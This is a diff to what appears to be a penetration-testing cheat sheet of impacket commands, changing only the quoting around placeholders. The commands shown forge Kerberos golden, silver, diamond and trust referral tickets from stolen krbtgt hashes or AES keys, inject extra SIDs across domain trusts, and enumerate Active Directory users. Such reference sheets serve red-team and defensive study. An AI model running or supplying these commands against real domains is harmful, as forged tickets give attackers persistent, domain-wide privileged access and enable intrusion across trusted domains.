@@ -53,24 +53,24 @@ impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <DOMAIN> <ra
 ## Ticketer - (golden ticket) - with an AES 128/256bits key
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -aesKey "<krbtgtAESkey>" -domain-sid "<domainSID>" -domain "<DOMAIN>" "<randomuser>"
+impacket-ticketer -aesKey '<krbtgtAESkey>' -domain-sid '<domainSID>' -domain '<DOMAIN>' '<randomuser>'
 ```
 
 ## Ticketer - (golden ticket) - with an RC4 key, i.e. NT hash with custom user/groups ids
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -nthash "<krbtgtNThash>" -domain-sid "<domainSID>" -domain "<DOMAIN>" -user-id "<USER-ID>" -groups "<GROUPS-ID>" "<randomuser>"
+impacket-ticketer -nthash '<krbtgtNThash>' -domain-sid '<domainSID>' -domain '<DOMAIN>' -user-id '<USER-ID>' -groups '<GROUPS-ID>' '<randomuser>'
 ```
 
 ## Ticketer - Generate golden ticket with extra SID
 
 ```
-impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
+impacket-ticketer -nthash '<hash>' -domain-sid '<domain-sid>' -domain '<domain-FQDN>' -extra-sid '<target_domain_SID-RID>' '<someusername>'
 ```
 
 # Trust - forge the referral ticket
 ```
-impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain-FQDN>" "someusername"
+impacket-ticketer -nthash '<hash>' -domain-sid '<domain-sid>' -domain '<domain-FQDN>' -extra-sid '<target_domain_SID-RID>' -spn 'krbtgt/<domain-FQDN>' 'someusername'
 ```
 
 
@@ -83,7 +83,7 @@ impacket-ticketer -nthash <hash> -domain-sid <domain-sid> -domain <DOMAIN> -spn 
 ## Ticketer - (silver ticket) - with an AES (128 or 256 bits) key
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -aesKey "<AESkey>" -domain-sid "<DomainSID>" -domain "<DOMAIN>" -spn "<SPN>" "<username>"
+impacket-ticketer -aesKey '<AESkey>' -domain-sid '<DomainSID>' -domain '<DOMAIN>' -spn '<SPN>' '<username>'
 ```
 
 ## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
@@ -113,7 +113,7 @@ impacket-GetADUsers -all <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC-IP>
 ## Diamond tickets - Forge Diamond tickets
 #plateform/linux #target/remote  #cat/RECON 
 ```
-impacket-ticketer -request -domain "<DOMAIN>" -user "<USER>" -password "<PASSWORD>" -nthash 'krbtgt/<HASH>' -aesKey 'krbtgt/<AES_KEY>' -domain-sid '<DOMAIN-SID>' -user-id '<ID>' -groups '<GROUPS-ID>' '<randomuser>'
+impacket-ticketer -request -domain '<DOMAIN>' -user '<USER>' -password '<PASSWORD>' -nthash 'krbtgt/<HASH>' -aesKey 'krbtgt/<AES_KEY>' -domain-sid '<DOMAIN-SID>' -user-id '<ID>' -groups '<GROUPS-ID>' '<randomuser>'
 ```
 
 ## Sapphire tickets - Forge Sapphire tickets
